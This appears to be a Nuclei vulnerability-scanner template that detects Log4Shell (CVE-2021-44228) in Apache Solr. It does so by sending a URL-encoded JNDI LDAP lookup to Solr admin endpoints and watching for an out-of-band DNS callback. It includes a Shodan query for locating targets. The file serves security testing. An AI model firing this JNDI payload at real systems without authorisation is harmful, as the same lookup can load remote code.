http:
- attack: clusterbomb
  extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - org.apache.solr
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  payloads:
    endpoint:
    - collections
    - cores
  raw:
  - '@timeout: 25s

    GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D
    HTTP/1.1

    Host: {{Hostname}}

    '
id: apache-solr-log4j-rce
info:
  author: Evan Rubinstein,nvn1729,j4vaovo
  classification:
    cpe: cpe:2.3:a:apache:solr:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages,
    and parameters do not protect against attacker controlled LDAP and other JNDI
    related endpoints. This vulnerability affects Solr 7+.

    '
  metadata:
    max-request: 2
    product: solr
    shodan-query: http.html:"Apache Solr"
    vendor: apache
    verified: true
  name: Apache Solr 7+ - Remote Code Execution (Apache Log4j)
  reference:
  - https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228
  - https://twitter.com/sirifu4k1/status/1470011568834424837
  - https://github.com/apache/solr/pull/454
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228
  severity: critical
  tags: vulhub,cve,solr,oast,log4j,cve2021,rce,apache,jndi,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
